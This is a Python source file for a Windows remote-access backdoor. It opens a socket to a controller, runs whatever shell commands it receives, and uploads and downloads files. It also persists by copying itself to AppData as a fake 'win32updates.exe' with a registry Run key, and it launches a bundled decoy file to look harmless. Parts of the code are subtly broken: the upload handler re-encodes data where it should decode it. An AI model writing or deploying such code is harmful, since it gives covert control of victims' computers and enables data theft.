import base64
import os
import shutil
import subprocess
import sys
import simplejson
import socket


class Socket:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def data_receive(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024).decode()
                return simplejson.loads(data)
            except ValueError:
                continue

    def get_file_contents(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def save_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64encode(content))
            return "Successfully Uploaded"

    def execute_cd(self, dir):
        os.chdir(dir)
        return "Directory changed as "+dir

    def execute(self, command):
        return subprocess.check_output(command, shell=True)

    def start_socket(self):
        while True:
            command = self.data_receive()
            result = ""
            try:
                if command[0] == "quit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    result = self.execute_cd(command[1])
                elif command[0] == "download" and len(command) > 1:
                    result = self.get_file_contents(command[1])
                elif command[0] == "upload" and len(command) > 1:
                    result = self.save_file(command[1], command[2])
                else:
                    result = self.execute(command)
            except Exception:
                result = "Error"
            self.connection.send(simplejson.dumps(result).encode("utf-8"))
        self.connection.close()


def add_persistence():
    new_file = os.environ["appdata"] + "\\win32updates.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)


def open_added_file():
    added_file_path = sys._MEIPASS + "\\"
    subprocess.Popen(added_file_path, shell=True)


open_added_file()

add_persistence()
IPAddr = ""
Port = 8080
my_socket = Socket(IPAddr, Port)
my_socket.start_socket()
